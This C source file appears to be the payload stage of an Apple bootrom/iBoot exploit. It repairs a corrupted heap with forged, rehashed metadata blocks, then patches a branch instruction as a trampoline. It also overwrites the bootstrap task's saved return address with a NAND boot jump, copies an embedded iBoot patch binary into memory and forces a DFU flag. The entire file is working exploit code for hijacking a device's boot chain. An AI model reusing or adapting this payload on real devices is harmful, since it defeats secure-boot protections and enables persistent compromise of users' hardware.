#include <stdint.h>
#include <stdbool.h>

#include <common.h>
#include "ibootpatch2/ibootpatch2.h"

extern uint64_t MEMCPY_OFFSET;
extern uint64_t TRAMPOLINE;

extern uint64_t HEAP_BASE;
extern uint64_t HEAP_WRITE_OFFSET;
extern uint64_t HEAP_STATE;
extern uint64_t HEAP_WRITE_HASH;
extern uint64_t HEAP_CHECK_ALL;
extern uint64_t DFU_BOOL;
extern uint64_t BOOTSTRAP_TASK_LR;
extern uint64_t NAND_BOOT_JUMP;

int payload(uint64_t arg0)
{
    
    my_memcpy = (memcpy_t)MEMCPY_OFFSET;
    
    heapWriteHash = (write_t)HEAP_WRITE_HASH;
    heapCheckAll = (check_t)HEAP_CHECK_ALL;
    
    uint64_t block1[8];
    uint64_t block2[8];
    
    block1[0] =          0;
    block1[1] =          0;
    block1[2] =          0;
    block1[3] = HEAP_STATE;
    block1[4] =          2;
    block1[5] =        132;
    block1[6] =        128;
    block1[7] =          0;
    
    block2[0] =          0;
    block2[1] =          0;
    block2[2] =          0;
    block2[3] = HEAP_STATE;
    block2[4] =          2;
    block2[5] =          8;
    block2[6] =        128;
    block2[7] =          0;
    
    if(HEAP_WRITE_HASH != 0)
    {
        my_memcpy((void*)(HEAP_BASE + HEAP_WRITE_OFFSET        ), (void*)block1, sizeof(block1));
        my_memcpy((void*)(HEAP_BASE + HEAP_WRITE_OFFSET +  0x80), (void*)block2, sizeof(block2));
        my_memcpy((void*)(HEAP_BASE + HEAP_WRITE_OFFSET + 0x100), (void*)block2, sizeof(block2));
        my_memcpy((void*)(HEAP_BASE + HEAP_WRITE_OFFSET + 0x180), (void*)block2, sizeof(block2));
        heapWriteHash(HEAP_BASE + HEAP_WRITE_OFFSET        );
        heapWriteHash(HEAP_BASE + HEAP_WRITE_OFFSET +  0x80);
        heapWriteHash(HEAP_BASE + HEAP_WRITE_OFFSET + 0x100);
        heapWriteHash(HEAP_BASE + HEAP_WRITE_OFFSET + 0x180);
        heapCheckAll(0);
        // Heap repaired
    }
    
    if(TRAMPOLINE != 0)
    {
        uint32_t* insn = (uint32_t*)TRAMPOLINE;
        insn[0] = 0x14000100;
    }
    
    if(BOOTSTRAP_TASK_LR != 0)
    {
        uint64_t* boottask_lr = (uint64_t*)BOOTSTRAP_TASK_LR;
        boottask_lr[0] = NAND_BOOT_JUMP;
    }
     
    if(TRAMPOLINE != 0)
    {
        my_memcpy((void*)(TRAMPOLINE + 0x400), ibootpatch2_bin, ibootpatch2_bin_len);
    }
    
    if(DFU_BOOL != 0)
    {
        uint8_t* dfuboot = (uint8_t*)DFU_BOOL;
        dfuboot[0] = 1;
    }
    
    return 0;
}

int main(void)
{
    return 0;
}
